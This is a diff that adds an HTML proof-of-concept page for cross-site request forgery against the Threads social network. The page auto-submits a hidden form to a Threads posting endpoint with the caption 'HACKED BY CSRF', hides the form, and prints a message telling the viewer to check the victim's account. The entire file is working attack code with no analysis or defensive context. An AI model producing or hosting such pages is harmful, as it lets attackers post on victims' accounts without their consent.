@@ -1,0 +1,46 @@
+﻿<html>
+  <head>
+    <title>Threads CSRF PoC</title>
+  </head>
+  <body>
+    <h1>Threads CSRF Demonstration</h1>
+    <p>This page will automatically submit a post to Threads.</p>
+    
+    <form id="csrfForm" 
+          action="https://www.threads.com/api/v1/media/configure_text_only_post/" 
+          method="POST"
+          enctype="application/x-www-form-urlencoded">
+      
+      <input type="hidden" name="audience" value="default">
+      <input type="hidden" name="barcelona_source_reply_id" value="">
+      <input type="hidden" name="caption" value="HACKED BY CSRF">
+      <input type="hidden" name="creator_geo_gating_info" value='{"whitelist_country_codes":[]}'>
+      <input type="hidden" name="custom_accessibility_caption" value="">
+      <input type="hidden" name="gen_ai_detection_method" value="">
+      <input type="hidden" name="internal_features" value="">
+      <input type="hidden" name="is_meta_only_post" value="">
+      <input type="hidden" name="is_paid_partnership" value="">
+      <input type="hidden" name="is_upload_type_override_allowed" value="1">
+      <input type="hidden" name="publish_mode" value="text_post">
+      <input type="hidden" name="text_post_app_info" value='{"entry_point":"main_tab_bar","excluded_inline_media_ids":"[]","fediverse_composer_enabled":true,"is_spoiler_media":false,"link_attachment_url":null,"reply_control":0,"special_effects_enabled_str":null,"tag_header":null,"text_with_entities":{"entities":[],"text":"HACKED BY CSRF"}}'>
+      <input type="hidden" name="upload_id" value="1751655596906">
+      <input type="hidden" name="jazoest" value="22618">
+      <input type="hidden" name="csrfmiddlewaretoken" value="FAKE_TOKEN">
+      
+      <input type="submit" value="Submit Post (visible only for testing)">
+    </form>
+
+    <script>
+      // Auto-submit the form
+      document.getElementById('csrfForm').submit();
+      
+      // Optional: Hide the form after submission
+      document.getElementById('csrfForm').style.display = 'none';
+      
+      // Optional: Show success message
+      setTimeout(function() {
+        document.body.innerHTML += '<p>CSRF attack attempted. Check the victim\'s Threads account.</p>';
+      }, 1000);
+    </script>
+  </body>
+</html>
